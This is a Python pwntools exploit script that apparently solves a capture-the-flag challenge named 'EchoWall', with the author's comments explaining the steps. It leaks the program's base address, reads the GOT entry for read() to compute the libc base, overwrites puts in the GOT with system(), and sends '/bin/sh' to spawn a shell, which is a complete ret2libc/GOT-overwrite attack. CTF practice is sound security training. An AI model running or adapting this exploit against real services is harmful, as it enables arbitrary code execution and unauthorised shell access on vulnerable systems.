from pwn import * 

binary = ("./EchoWall_patched") # patched binary with libc for ret2libc 
# i.e. calculating system() under libc, hijack functions to be system(), pass in argumnets and 
# call shell 


# got to have the same binary as the challenge server (I mean ofc )
# but it's for elf to work, because this would be the binary that elf would be analysing 
p = process(binary) # the binary object 
#p = remote("chal.firebird.sh", 35027)
s = 'b * UwU_main+359'
elf = ELF(binary) # contains info like addresses of functions, offsets
libc = ELF('./libc.so.6') # contains infor like actual addresses of libc functions
gdb.attach(p, s)
context.log_level = 'debug'



p.recvuntil(b'0x') 
leak_addr = int(b'0x' + p.recvuntil(b'|', drop = True), 16)
elf.address = leak_addr - elf.sym['print_wall'] # setting base address of the program 
# from now on elf.sym[] presents the actual acddress but no just offset 



p.sendlineafter("Do you want to read some messages written by others? (1: Yes, 2:No)\n> ", b'1')
p.sendafter("Where do you want to read? ヽ( ^ω^ ゞ )\n> ", p64(elf.got['read'])) # leaking GOT entry (libc func address)
#p64(elf.got['puts'])) shows 0 probably because it has never been called yet
#on newer version 2.40, it doesn't maybe using old values
p.recvuntil(b'The message is: ') 
leak_libc_addr = int.from_bytes(p.recvuntil(b' ', drop = True), 'little')
print(hex(leak_libc_addr))
print(hex(libc.sym['read']))
libc.address = leak_libc_addr - libc.sym['read']

print(hex(libc.address))
p.sendlineafter("Would you like to leave a message on the Echo Wall UwU? (1: Yes, 2:Yes)\n> ", b'2')

p.sendafter("Where do you want to write? ヽ( ^ω^ ゞ )\n> ", p64(elf.got['puts']))
p.sendafter("Cool! (*´ω`)人(´ω`*) Then... What do you want to write? (ゝ∀･)\n> ", p64(libc.sym['system']))


p.sendlineafter("Lets shout!\n> ", b'/bin/sh')

p.interactive()